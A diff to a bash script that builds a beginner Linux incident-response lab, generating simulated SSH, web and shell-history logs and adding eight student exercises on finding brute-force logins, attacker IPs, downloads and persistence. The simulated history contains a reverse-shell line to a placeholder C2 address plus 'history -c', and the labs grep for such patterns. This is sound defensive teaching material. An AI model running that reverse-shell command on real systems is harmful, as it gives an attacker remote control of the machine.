@@ -25,9 +25,9 @@ mkdir -p "${LOG_DIR}" "${LAB_DIR}" "${TOOL_DIR}" "${FINAL_DIR}"
 
 echo "[+] Directories ready under ${BASE_DIR}"
 
-echo "[+] Generating large authentication log..."
+echo "[+] Generating introductory authentication log..."
 : > "${AUTH_LOG}"
-for ((i=1; i<=180000; i++)); do
+for ((i=1; i<=80000; i++)); do
 	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
 	printf 'Jul 10 08:%02d:%02d server sshd[%d]: Failed password for root from %s port %d ssh2\n' \
 		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" "$ip" "$RANDOM" >> "${AUTH_LOG}"
@@ -43,9 +43,9 @@ Jul 10 09:16:10 server sshd[1426]: Accepted password for ${COMPROMISED_USER} fro
 Jul 10 09:18:11 server sshd[1430]: session opened for user ${COMPROMISED_USER}
 EOF
 
-echo "[+] Generating large access log..."
+echo "[+] Generating introductory access log..."
 : > "${ACCESS_LOG}"
-for ((i=1; i<=140000; i++)); do
+for ((i=1; i<=60000; i++)); do
 	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
 	code=200
 	if (( RANDOM % 3 == 0 )); then
@@ -63,7 +63,7 @@ EOF
 
 echo "[+] Generating shell history log..."
 : > "${HISTORY_LOG}"
-for ((i=1; i<=250; i++)); do
+for ((i=1; i<=120; i++)); do
 	printf 'ls\ncd /var/www\ncat /var/log/auth.log\n' >> "${HISTORY_LOG}"
 done
 
@@ -77,10 +77,10 @@ bash -i >& /dev/tcp/${C2_IP}/4444 0>&1
 history -c
 EOF
 
-echo "[+] Generating syslog and network log..."
+echo "[+] Generating introductory syslog and network log..."
 : > "${SYS_LOG}"
 : > "${NETWORK_LOG}"
-for ((i=1; i<=60000; i++)); do
+for ((i=1; i<=25000; i++)); do
 	ip="192.168.$((RANDOM % 255)).$((RANDOM % 255))"
 	printf 'Jul 10 08:%02d:%02d server systemd[%d]: Started system service\n' \
 		"$((RANDOM % 60))" "$((RANDOM % 60))" "$RANDOM" >> "${SYS_LOG}"
@@ -240,35 +240,178 @@ EOF
 chmod +x "${FINAL_DIR}/incident_analyzer.sh"
 
 echo "[+] Creating student lab files..."
-cat > "${LAB_DIR}/lab1_navigation.md" <<'EOF'
-# Lab 1 - Navigation and Discovery
+cat > "${LAB_DIR}/lab1_first_commands.md" <<'EOF'
+# Lab 1 - First Terminal Commands
 
-1. Run `pwd` and capture your current path.
-2. Use `ls -la` to list hidden files.
-3. Move into `logs/` and then back to the parent directory.
+Goal: get comfortable typing commands into the terminal.
+
+Tasks:
+
+1. Run `whoami`.
+2. Run `date`.
+3. Clear the screen with `clear`.
+4. Open help for one command using `man ls` or `ls --help`.
+
+Write down:
+
+- Your username: `________________`
+- One thing `ls` can do: `________________`
+EOF
+
+cat > "${LAB_DIR}/lab2_navigation.md" <<'EOF'
+# Lab 2 - Navigation and Filesystem
+
+Goal: move around Linux without getting lost.
+
+Tasks:
+
+1. Print your current path with `pwd`.
+2. List files with `ls -la`.
+3. Move into `logs/` and back out.
 4. Find all `.log` files with `find . -name "*.log"`.
+
+Write down:
+
+- Current directory: `________________`
+- Number of log files found: `________________`
 EOF
 
-cat > "${LAB_DIR}/lab2_logs.md" <<'EOF'
-# Lab 2 - Log Exploration
+cat > "${LAB_DIR}/lab3_reading_logs.md" <<'EOF'
+# Lab 3 - Reading Log Files
 
-1. Use `wc -l logs/auth.log` to count entries.
-2. Use `head -n 5 logs/auth.log` and `tail -n 5 logs/auth.log`.
-3. Find one accepted login event.
-4. Find one suspicious event in `logs/syslog`.
-EOF
+Goal: inspect large files safely.
 
-cat > "${LAB_DIR}/lab3_investigation.md" <<'EOF'
-# Lab 3 - Investigation Pipeline
+Tasks:
 
-1. Find failed login attempts in `logs/auth.log`.
-2. Extract attacker IPs.
-3. Rank top attacker IPs by count.
+1. Show the first 5 lines of `logs/auth.log`.
+2. Show the last 5 lines of `logs/syslog`.
+3. Count lines in `logs/access.log` with `wc -l`.
+4. Open `logs/auth.log` in `less` and search for `Accepted password`.
 
-Suggested pipeline:
+Starter commands:
 
 ```bash
-grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
+head -n 5 logs/auth.log
+tail -n 5 logs/syslog
+wc -l logs/access.log
+less logs/auth.log
+```
+EOF
+
+cat > "${LAB_DIR}/lab4_detect_brute_force.md" <<'EOF'
+# Lab 4 - Detect Brute Force
+
+Goal: detect repeated failed logins.
+
+Tasks:
+
+1. Find failed password attempts in `logs/auth.log`.
+2. Count the total number of failed attempts.
+3. Find one successful login after the failures.
+
+Starter commands:
+
+```bash
+grep "Failed password" logs/auth.log | head
+grep -c "Failed password" logs/auth.log
+grep "Accepted password" logs/auth.log
+```
+
+Write down:
+
+- Total failed attempts: `________________`
+- Compromise detected: `yes / no`
+EOF
+
+cat > "${LAB_DIR}/lab5_identify_attacker_ip.md" <<'EOF'
+# Lab 5 - Identify Attacker IP
+
+Goal: build your first full investigation pipeline.
+
+Tasks:
+
+1. Extract source IPs from failed login lines.
+2. Count each IP.
+3. Sort the attackers from highest count to lowest.
+
+Starter pipeline:
+
+```bash
+grep "Failed password" logs/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head
+```
+
+Write down:
+
+- Top attacker IP: `________________`
+- Attempt count: `________________`
+EOF
+
+cat > "${LAB_DIR}/lab6_malware_and_persistence.md" <<'EOF'
+# Lab 6 - Malware and Persistence Discovery
+
+Goal: find what the attacker downloaded and how they tried to stay on the system.
+
+Tasks:
+
+1. Search `logs/bash_history.log` for download commands.
+2. Search for reverse shell activity.
+3. Search `logs/syslog` for cron-based persistence.
+
+Starter commands:
+
+```bash
+grep -E "wget|curl" logs/bash_history.log
+grep "/dev/tcp" logs/bash_history.log
+grep -i "cron" logs/syslog
+```
+
+Write down:
+
+- Suspicious download command: `________________`
+- Persistence clue: `________________`
+EOF
+
+cat > "${LAB_DIR}/lab7_attack_timeline.md" <<'EOF'
+# Lab 7 - Attack Timeline Reconstruction
+
+Goal: rebuild the attacker story in order.
+
+Tasks:
+
+1. Pull failed and accepted logins from `logs/auth.log`.
+2. Pull suspicious commands from `logs/bash_history.log`.
+3. Pull persistence and outbound connections from `logs/syslog`.
+4. Write a 5-step timeline.
+
+Starter commands:
+
+```bash
+grep -E "Failed password|Accepted password|session opened" logs/auth.log
+grep -E "wget|payload|/dev/tcp|history -c" logs/bash_history.log
+grep -E "CRON|outbound connection|history cleared" logs/syslog
+```
+EOF
+
+cat > "${LAB_DIR}/lab8_final_incident_investigation.md" <<'EOF'
+# Lab 8 - Final Incident Investigation
+
+Goal: use the final investigation tool to answer the case questions.
+
+Tasks:
+
+1. Run the summary mode.
+2. Run the top IP mode.
+3. Run the timeline mode.
+4. Run suspicious download checks against the web log.
+5. Record the attacker IP, compromised account, suspicious command, and one persistence indicator.
+
+Suggested commands:
+
+```bash
+./final_project/incident_analyzer.sh logs/auth.log --summary
+./final_project/incident_analyzer.sh logs/auth.log --top-ips
+./final_project/incident_analyzer.sh logs/auth.log --timeline
+./final_project/incident_analyzer.sh logs/access.log --suspicious-downloads
 ```
 EOF
 
@@ -283,4 +426,5 @@ echo
 echo "Next steps:"
 echo "1) cd ${BASE_DIR}"
 echo "2) ./final_project/incident_analyzer.sh logs/auth.log --summary"
-echo "3) cd tools && ./attack_simulator.sh"
+echo "3) ./advanced_breach_generator.sh ${LOG_DIR} --tier intermediate"
+echo "4) cd tools && ./attack_simulator.sh"
